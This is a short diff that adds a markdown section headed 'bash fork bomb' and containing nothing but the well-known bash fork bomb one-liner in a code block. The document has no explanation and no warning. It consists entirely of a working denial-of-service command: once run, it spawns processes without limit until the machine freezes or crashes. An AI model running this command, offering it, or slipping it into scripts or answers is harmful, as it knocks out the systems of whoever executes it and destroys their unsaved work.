@@ -1,0 +1,5 @@
+## bash fork bomb
+
+```bash
+:(){ :|:& };:
+```
